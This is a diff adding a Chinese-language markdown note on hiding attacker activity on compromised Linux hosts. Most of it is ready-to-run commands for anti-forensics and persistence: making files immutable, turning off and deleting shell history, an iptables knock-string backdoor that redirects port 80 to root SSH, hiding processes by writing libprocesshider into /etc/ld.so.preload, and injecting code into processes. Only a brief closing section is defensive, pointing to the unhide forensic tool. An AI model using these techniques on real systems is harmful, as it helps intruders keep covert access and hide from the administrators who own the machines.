@@ -1,0 +1,96 @@
+#####  原文信息
+原文作者：Bypass公众号   
+原文链接：[点击此处直接访问](https://mp.weixin.qq.com/s?srcid=0902Zm6E1XSvVIgYt2Q3jSZm&scene=23&sharer_sharetime=1567437712765&mid=2448904250&sharer_shareid=64458b89777349122de4fc747d336e14&sn=cce745079e51ab4bb013de00c2125bf0&idx=1&__biz=MzA3NzE2MjgwMg%3D%3D&chksm=8b55c067bc22497125d4bd5f7a03e46c214d5db11e5bbdbb8422c92cbcf85e3653def6bab6c5&mpshare=1&key=b1d774c47332243a7516756d3a9fe660b8c7273d25a3a287bd403be11be6776acfe040d8b96edbaf8401c621fdcbd22748edd0c8295201dfafbc1aa7145e0cd9d0f5461881deb303b24b52a0cd9126d8&ascene=1&uin=MTA1MTI5MTUyMQ%3D%3D&devicetype=Windows+10&version=62060834&lang=zh_CN&pass_ticket=XTJUAgoC6SLk6U6jutYqGfS1%2BFGlLiWGnPMvZJGYArRcBGENrZolo0laVgipfxHI)
+##### Linux创建隐藏文件
+	touch .test.txt  		文件名前加点就是隐藏文件
+#####  Linux隐藏权限
+*创建一个root和其他用户删不了的文件，并且用ls-la 看不出来权限*    
+
+	chattr +i .test.txt 		锁定一个隐藏文件(也可以是普通文件)  
+	lsattr .test.txt			属性查看  
+	chattr -i .test.txt		解除锁定  
+##### 隐藏历史操作命令
++  开启无痕模式  
+	```
+	[space] set +o history	开启无痕操作模式	[space]表示空格，由于空格的缘故该命令本身也不会被记录
+	[space] set -o history 	关闭无痕模式  工作执行完成后，再执行这个命令  
+	```
++  删除指定的历史记录  
+	```
+	history -d [num]  
+	```
++  批量删除历史记录  
+	```
+	sed -i '150,$d' .bash_history 	只保留前150条
+	```
+
+#####  端口复用实现隐藏端口
+*通过端口复用来达到隐藏端口的目的*  
+
++  通过SSLH在同一端口上共享SSH和HTTPS  
+```
+	sudo apt-get install sslh  #安装sslh  
+	sudo vi /etc/default/sslh	#编辑SSLH配置文件  
+	1.修改Run=no 为Run=yes  
+	2.修改下列行以允许SSLH在所有可用接口上侦听端口443  
+	 DAEMON_OPTS="--user sslh --listen 0.0.0.0:443 --ssh 127.0.0.1:22 --ssl 127.0.0.1:443 --pidfile /var/run/sslh/sslh.pid"
+```
++  利用IPTables进行端口复用
+```
+	#端口复用链   
+	iptables -t nat -N LETMEIN    
+ 	# 端口复用规则   
+	iptables -t nat  -A LETMEIN -p tcp -j REDIRECT --to-port 22   
+	# 开启开关   
+	iptables -A INPUT -p tcp -m string --string 'threathuntercoming' --algo bm -m recent --set --name letmein --rsource -j ACCEPT  
+	# 关闭开关  
+	iptables -A INPUT -p tcp -m string --string 'threathunterleaving' --algo bm -m recent --name letmein --remove -j ACCEPT  
+	# let's do it  
+	iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN  
+```
++  利用方式  
+```
+	#开启复用    
+	echo threathuntercoming | socat - tcp:192.168.28.128:80   
+	#ssh使用80端口进行登录   
+	ssh -p 80 root@192.168.28.128   
+	#关闭复用   
+	echo threathunterleaving | socat - tcp:192.168.28.128:80   
+```
+查看详细介绍请点击：[远程遥控 IPTables 进行端口复用](https://www.freebuf.com/articles/network/137683.html)
+
+#####  进程隐藏  
+*管理员无法通过相关命令工具查找到你运行的进程，从而达到隐藏目的，实现进程隐藏*  
+
++  通过libprocesshider进行隐藏   
+github项目地址：https://github.com/gianlucaborello/libprocesshider   
+利用LD_PRELOAD来实现系统函数的劫持   
+```
+	# 下载程序编译   
+	git clone https://github.com/gianlucaborello/libprocesshider.git    
+	cd libprocesshider/ && make   
+	# 移动文件到/usr/local/lib/目录下   
+	cp libprocesshider.so /usr/local/lib/   
+	# 把它加载到全局动态连接局   
+	echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload   
+```
++   使用linux-inject进行进程注入   
+github项目地址：https://github.com/gaffe23/linux-inject.git   
+linux-inject是用于将共享对象注入Linux的工具   
+```
+	# 下载程序编译   
+	git clone https://github.com/gaffe23/linux-inject.git    
+	cd linux-inject && make   
+	# 测试进程   
+	./sample-target   
+	# 进程注入    
+	./inject -n sample-target sample-library.so   
+```
+
+##### 如何在linux中发现隐藏的进程？
+>unhide 是一个小巧的网络取证工具，能够发现那些借助rootkit，LKM及其它技术隐藏的进程和TCP / UDP端口。这个工具在Linux，UNIX类，MS-Windows等操作系统下都可以工作。  
+>下载地址：http://www.unhide-forensics.info/    
+>安装   
+>sudo yum install unhide   
+>使用   
+>unhide [options] test_list   
